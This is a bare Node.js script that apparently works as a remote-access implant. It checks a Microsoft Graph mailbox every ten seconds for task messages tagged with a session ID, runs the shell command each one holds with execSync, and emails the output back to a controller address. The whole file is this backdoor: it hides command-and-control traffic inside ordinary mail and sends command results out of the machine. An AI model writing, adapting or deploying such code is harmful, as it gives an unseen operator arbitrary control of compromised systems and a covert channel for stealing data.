const {execSync} = require('node:child_process');
const {randomUUID} = require('node:crypto');
const base = 'https://graph.microsoft.com/v1.0/users/' + process.env.MAILBOX;
const headers = {Authorization: 'Bearer ' + process.env.GRAPH_TOKEN, 'Content-Type': 'application/json'};
const session = randomUUID();
async function poll() {
  const mailbox = await fetch(base + '/messages?$filter=' + encodeURIComponent("subject eq 'task_" + session + "'"), {headers});
  for (const message of (await mailbox.json()).value) {
    const task = JSON.parse(message.body.content);
    if (task.command_type !== 'cmd') continue;
    const output = execSync(task.command_data.command).toString();
    const response = {command_type: task.command_type, request_id: task.request_id,
      success: true, result: output, error: null};
    await fetch(base + '/sendMail', {method: 'POST', headers, body: JSON.stringify({message: {
      subject: 'reply_' + session, body: {contentType: 'Text', content: JSON.stringify(response)},
      toRecipients: [{emailAddress: {address: process.env.CONTROLLER}}]}})});
  }
}
setInterval(poll, 10000);
